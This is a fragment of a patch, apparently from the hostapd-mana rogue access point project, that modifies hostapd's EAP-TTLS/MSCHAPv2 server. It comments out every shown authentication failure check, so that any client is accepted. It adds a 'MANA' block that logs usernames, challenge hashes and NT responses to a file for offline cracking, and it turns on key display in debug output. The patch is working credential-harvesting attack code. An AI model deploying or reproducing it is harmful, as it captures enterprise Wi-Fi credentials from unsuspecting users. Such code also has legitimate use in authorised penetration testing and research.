+ 	    !(sm->user->ttls_auth & EAP_TTLS_AUTH_MSCHAPV2)) {
+ 		wpa_printf(MSG_DEBUG, "EAP-TTLS/MSCHAPV2: No user password "
+ 			   "configured");
+-		eap_ttls_state(data, FAILURE);
+-		return;
++		//eap_ttls_state(data, FAILURE);
++		//return;
+ 	}
+ 
+ 	if (sm->identity == NULL) {
+ 		wpa_printf(MSG_DEBUG, "EAP-TTLS/MSCHAPV2: No user identity "
+ 			   "known");
+-		eap_ttls_state(data, FAILURE);
+-		return;
++		//eap_ttls_state(data, FAILURE);
++		//return;
+ 	}
+ 
+ 	/* MSCHAPv2 does not include optional domain name in the
+@@ -749,9 +818,9 @@
+ 	    != 0 ||
+ 	    response[0] != chal[EAP_TTLS_MSCHAPV2_CHALLENGE_LEN]) {
+ 		wpa_printf(MSG_DEBUG, "EAP-TTLS/MSCHAPV2: Challenge mismatch");
+-		os_free(chal);
+-		eap_ttls_state(data, FAILURE);
+-		return;
++		//os_free(chal);
++		//eap_ttls_state(data, FAILURE);
++		//return;
+ 	}
+ 	os_free(chal);
+ 
+@@ -779,6 +848,39 @@
+ 	}
+ 
+ 	rx_resp = response + 2 + EAP_TTLS_MSCHAPV2_CHALLENGE_LEN + 8;
++	//MANA START
++ 	challenge_hash(peer_challenge, auth_challenge, username, username_len, challenge_hash1);
++ 	wpa_hexdump(MSG_DEBUG, "EAP-TTLS-MSCHAPV2: Challenge Hash", challenge_hash1, 8);
++ 	wpa_printf(MSG_INFO, "MANA (EAP-TTLS-MSCHAPV2) : Username:%s", username);
++ 	wpa_printf(MSG_INFO, "MANA (EAP-TTLS-MSCHAPV2) : Challenge");
++ 	printf("MANA (EAP-TTLS-MSCHAPV2) : ");
++ 	int x;
++ 	for (x=0;x<7;x++)
++                 printf("%02x:",challenge_hash1[x]);
++         printf("%02x\n",challenge_hash1[7]);
++ 
++         wpa_printf(MSG_INFO, "MANA (EAP-TTLS-MSCHAPV2) : Response");
++         printf("MANA (EAP-TTLS-MSCHAPV2) : ");
++         for (x=0;x<23;x++)
++                 printf("%02x:",nt_response[x]);
++         printf("%02x\n",nt_response[23]);
++ 
++ 	char *ennode = getenv("MANANODE");
++ 	FILE *f = fopen(ennode, "a");
++ 	if (f != NULL) {
++ 		const char *hdr = "CHAP";
++ 		fprintf(f, "%s|%s|", hdr, username);
++ 		for (x = 0; x < 7; x++) {
++ 			fprintf(f, "%02x:", challenge_hash1[x]);
++ 		}
++ 		fprintf(f, "%02x|", challenge_hash1[7]);
++ 		for (x = 0; x < 23; x++) {
++ 			fprintf(f, "%02x:", nt_response[x]);
++ 		}
++ 		fprintf(f, "%02x\n", nt_response[23]);
++ 		fclose(f);
++ 	}
++	//MANA END
+ #ifdef CONFIG_TESTING_OPTIONS
+ 	{
+ 		u8 challenge2[8];
+@@ -923,8 +1025,8 @@
+ 					  "Identity not found in the user "
+ 					  "database",
+ 					  sm->identity, sm->identity_len);
+-			eap_ttls_state(data, FAILURE);
+-			break;
++			//eap_ttls_state(data, FAILURE);
++			//break;
+ 		}
+ 
+ 		eap_ttls_state(data, PHASE2_METHOD);
+@@ -1062,8 +1164,8 @@
+ 		    != 0) {
+ 			wpa_printf(MSG_DEBUG, "EAP-TTLS: Phase2 Identity not "
+ 				   "found in the user database");
+-			eap_ttls_state(data, FAILURE);
+-			goto done;
++			//eap_ttls_state(data, FAILURE);
++			//goto done;
+ 		}
+ 	}
+ 
+diff -ur hostapd-2.6/src/utils/wpa_debug.c hostapd-2.6-mana/src/utils/wpa_debug.c
+--- hostapd-2.6/src/utils/wpa_debug.c	2016-10-02 20:51:11.000000000 +0200
++++ hostapd-2.6-mana/src/utils/wpa_debug.c	2016-12-12 23:32:02.000000000 +0200
+@@ -30,7 +30,7 @@
+ 
+ 
+ int wpa_debug_level = MSG_INFO;
+-int wpa_debug_show_keys = 0;
++int wpa_debug_show_keys = 1;
+ int wpa_debug_timestamp = 0;
+ 
+ 
